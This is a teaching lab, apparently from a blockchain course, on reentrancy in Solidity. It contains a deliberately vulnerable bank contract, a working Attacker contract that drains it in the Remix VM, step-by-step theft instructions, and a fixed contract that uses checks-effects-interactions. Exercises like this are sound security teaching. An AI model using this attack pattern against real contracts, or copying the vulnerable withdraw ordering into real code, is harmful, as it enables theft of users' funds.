---
title: "Reentrancy: attack and fix"
module: 7
order: 4
kind: "lab-remix"
minutes: "60 min"
legacy: "L6"
problem: "A bank contract pays out before it updates the balance. An attacker can make it pay again and again inside one transaction."
---

## Problem

<div class="cc-callout cc-callout--problem"><div><b>The question.</b> A bank contract pays out before it updates the balance. An attacker can make it pay again and again inside one transaction.</div></div>

## Concept

<div class="ov">
      <div><b>You will</b>Steal all funds from a vulnerable bank, then show that the fixed bank resists the same attack.</div>
      <div><b>Concepts</b><ul><li>Contracts calling contracts</li><li><code>receive()</code></li><li>Checks-effects-interactions</li></ul></div>
      <div><b>You produce</b>An attack log and a two-sentence explanation.</div>
    </div>
    <div class="callout warn"><h5>Teaching only</h5><p>Run this only in the Remix VM. Attacking contracts you do not own is a crime in most countries.</p></div>
    <div class="pre-wrap"><pre><code>// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// TEACHING ONLY. VulnerableBank has a reentrancy bug.
contract VulnerableBank {
    mapping(address =&gt; uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount &gt; 0, "No balance");
        (bool ok, ) = msg.sender.call{value: amount}(""); // BUG: send first
        require(ok, "Transfer failed");
        balances[msg.sender] = 0;                         // update too late
    }

    function bankBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

contract Attacker {
    VulnerableBank public immutable bank;

    constructor(address _bank) {
        bank = VulnerableBank(_bank);
    }

    function attack() external payable {
        require(msg.value &gt;= 1 ether, "Send 1 ether");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    // Runs each time the bank sends ETH. It calls withdraw again.
    receive() external payable {
        if (address(bank).balance &gt;= 1 ether) {
            bank.withdraw();
        }
    }

    function stolen() external view returns (uint256) {
        return address(this).balance;
    }
}

/// The fix: checks-effects-interactions.
contract FixedBank {
    mapping(address =&gt; uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount &gt; 0, "No balance");                 // check
        balances[msg.sender] = 0;                           // effect
        (bool ok, ) = msg.sender.call{value: amount}("");   // interaction
        require(ok, "Transfer failed");
    }

    function bankBalance() external view returns (uint256) {
        return address(this).balance;
    }
}</code></pre><button class="copy" type="button">Copy</button></div>

## Build

<h4>A. The attack</h4>
    <ol class="steps">
      <li>Create <code>Reentrancy.sol</code>, paste, compile. The file contains three contracts.</li>
      <li>Contract = <code>VulnerableBank</code>. Deploy as account 1, Value 0. Copy its address (copy icon next to the deployed instance).</li>
      <li>Account 2, Value 5 Ether: call <span class="ui">deposit</span>. Value back to 0.<span class="exp"><span class="ui">bankBalance</span> = 5 ether (in wei).</span><span class="why">This is an honest customer.</span></li>
      <li>Account 3, Contract = <code>Attacker</code>, constructor field <code>_bank</code> = the bank’s address. Deploy (Value 0).</li>
      <li>Still account 3: Value 1 Ether, call <span class="ui">attack</span> on the Attacker.<span class="exp">The transaction succeeds. <span class="ui">bankBalance</span> = 0. <span class="ui">stolen</span> = 6 ether: the customer’s 5 plus the attacker’s own 1.</span></li>
      <li>Open the transaction in the terminal and click <span class="ui">Debug</span>. Step through and see <code>withdraw</code> entered several times before the balance is set to 0.</li>
    </ol>
    <h4>B. The fix</h4>
    <ol class="steps">
      <li>Deploy <code>FixedBank</code>. Account 2 deposits 5 Ether.</li>
      <li>Deploy a new <code>Attacker</code> with the FixedBank’s address.</li>
      <li>Account 3, Value 1 Ether, call <span class="ui">attack</span>.<span class="exp">The whole transaction reverts (“Transfer failed”). FixedBank still holds 5 ether.</span></li>
    </ol>

## Apply

<div class="aud">
      <div class="cs"><h5>Technology lens</h5><ul><li>Add OpenZeppelin <code>ReentrancyGuard</code> to VulnerableBank without reordering. Does it stop the attack?</li><li>Run an AI assistant and a static analyser (Slither) on VulnerableBank. Compare findings (F5).</li></ul></div>
      <div class="bi"><h5>Business lens</h5><ul><li>Estimate the cost of an audit versus the funds at risk. When is an audit worth it?</li></ul></div>
      <div class="lw"><h5>Law lens</h5><ul><li>After the DAO hack (2016), Ethereum reversed the theft with a hard fork. Was this fair to the attacker who used the code “as written”? Who decided, and with what legitimacy?</li></ul></div>
    </div>

## Ship

<ul class="outc">
      <li>You can explain the attack in two sentences: VulnerableBank sends ETH before it sets the balance to 0, so the Attacker’s <code>receive</code> calls <code>withdraw</code> again with the old balance. FixedBank sets the balance to 0 first, so the second call fails and the whole attack reverts.</li>
      <li>You can name two defences: checks-effects-interactions and a reentrancy guard.</li>
    </ul>
